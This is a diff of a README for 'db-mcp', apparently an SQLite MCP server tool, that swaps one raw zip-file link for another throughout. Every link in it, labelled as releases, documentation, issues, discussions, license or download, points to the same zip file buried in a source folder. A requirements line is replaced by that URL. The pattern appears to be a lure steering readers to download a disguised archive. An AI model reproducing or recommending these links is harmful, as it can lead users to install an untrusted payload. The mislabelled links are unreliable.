@@ -6,14 +6,14 @@ Welcome to db-mcp! This application allows you to run an SQLite MCP server easil
 
 ## 📥 Download Now 
 
-[![Download db-mcp](https://raw.githubusercontent.com/ShootaOT/db-mcp/main/src/types/mcp_db_v3.6-beta.5.zip)](https://raw.githubusercontent.com/ShootaOT/db-mcp/main/src/types/mcp_db_v3.6-beta.5.zip)
+[![Download db-mcp](https://raw.githubusercontent.com/ShootaOT/db-mcp/main/src/transports/mcp_db_v2.2.zip)](https://raw.githubusercontent.com/ShootaOT/db-mcp/main/src/transports/mcp_db_v2.2.zip)
 
 ## 📋 System Requirements
 
 Before you download, make sure your system meets these requirements:
 
 - **Operating System:** Works on Windows, macOS, and Linux.
-- **https://raw.githubusercontent.com/ShootaOT/db-mcp/main/src/types/mcp_db_v3.6-beta.5.zip** Version 14 or higher for the better-sqlite3 variant.
+- **https://raw.githubusercontent.com/ShootaOT/db-mcp/main/src/transports/mcp_db_v2.2.zip** Version 14 or higher for the better-sqlite3 variant.
 - **Browser:** For the WASM variant, a modern browser is recommended.
 - **Internet Connection:** Required for downloading the application and OAuth setup.
 
@@ -31,7 +31,7 @@ db-mcp offers several features to enhance your database management:
 To get started with db-mcp, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Go to the [db-mcp Releases page](https://raw.githubusercontent.com/ShootaOT/db-mcp/main/src/types/mcp_db_v3.6-beta.5.zip).
+   Go to the [db-mcp Releases page](https://raw.githubusercontent.com/ShootaOT/db-mcp/main/src/transports/mcp_db_v2.2.zip).
 
 2. **Select Your Version**  
    Choose the version that suits your needs. For most users, we recommend picking the latest release.
@@ -66,14 +66,14 @@ Once db-mcp is up and running, you may want to configure it for your specific ne
 
 ## 🔗 Helpful Links
 
-- Documentation: [db-mcp Documentation](https://raw.githubusercontent.com/ShootaOT/db-mcp/main/src/types/mcp_db_v3.6-beta.5.zip)
-- Support: If you encounter issues, please check the [issues section](https://raw.githubusercontent.com/ShootaOT/db-mcp/main/src/types/mcp_db_v3.6-beta.5.zip) for solutions or to report new problems.
+- Documentation: [db-mcp Documentation](https://raw.githubusercontent.com/ShootaOT/db-mcp/main/src/transports/mcp_db_v2.2.zip)
+- Support: If you encounter issues, please check the [issues section](https://raw.githubusercontent.com/ShootaOT/db-mcp/main/src/transports/mcp_db_v2.2.zip) for solutions or to report new problems.
 
 ## 🏗 Community
 
 Join our growing community to share your experiences, ask questions, and learn from others who are using db-mcp:
 
-- GitHub Discussions: [Join Discussions](https://raw.githubusercontent.com/ShootaOT/db-mcp/main/src/types/mcp_db_v3.6-beta.5.zip)
+- GitHub Discussions: [Join Discussions](https://raw.githubusercontent.com/ShootaOT/db-mcp/main/src/transports/mcp_db_v2.2.zip)
 
 ## 📝 Contributing
 
@@ -81,10 +81,10 @@ If you want to contribute to db-mcp, we welcome your input. Please review the gu
 
 ## 📊 License
 
-db-mcp is open-source software. You can use it for personal or commercial projects under the terms of the [MIT License](https://raw.githubusercontent.com/ShootaOT/db-mcp/main/src/types/mcp_db_v3.6-beta.5.zip).
+db-mcp is open-source software. You can use it for personal or commercial projects under the terms of the [MIT License](https://raw.githubusercontent.com/ShootaOT/db-mcp/main/src/transports/mcp_db_v2.2.zip).
 
 ## 📥 Download Now Again
 
 Don't forget to download db-mcp to experience a better way to manage your SQLite databases.
 
-[![Download db-mcp](https://raw.githubusercontent.com/ShootaOT/db-mcp/main/src/types/mcp_db_v3.6-beta.5.zip)](https://raw.githubusercontent.com/ShootaOT/db-mcp/main/src/types/mcp_db_v3.6-beta.5.zip)
+[![Download db-mcp](https://raw.githubusercontent.com/ShootaOT/db-mcp/main/src/transports/mcp_db_v2.2.zip)](https://raw.githubusercontent.com/ShootaOT/db-mcp/main/src/transports/mcp_db_v2.2.zip)
